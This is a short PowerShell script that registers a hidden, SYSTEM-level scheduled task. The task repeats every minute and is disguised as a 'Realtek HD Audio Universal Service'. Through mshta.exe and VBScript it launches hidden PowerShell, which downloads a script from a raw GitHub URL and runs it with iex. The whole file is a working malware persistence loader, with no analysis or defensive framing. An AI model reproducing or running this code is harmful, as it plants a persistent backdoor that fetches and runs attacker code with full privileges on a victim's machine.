$task_name = "Tor Service"

$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell (`$x=iwr('https://raw.githubusercontent.com/auracodersigmatoilete/lmaooo/refs/heads/main/hvmfmcb5xe95sw56.ps1')).Content;iex(`$x)`",0)(window.close)"

$task_trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1)
$task_trigger.RepetitionInterval = (New-TimeSpan -Minutes 1)
$task_trigger.RepetitionDuration = [TimeSpan]::MaxValue

$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable `
    -DontStopOnIdleEnd -StartWhenAvailable

Register-ScheduledTask -Action $task_action -Trigger $task_trigger `
    -Settings $task_settings -TaskName $task_name `
    -Description "Realtek HD Audio Universal Service" `
    -RunLevel Highest -Force -User "SYSTEM"

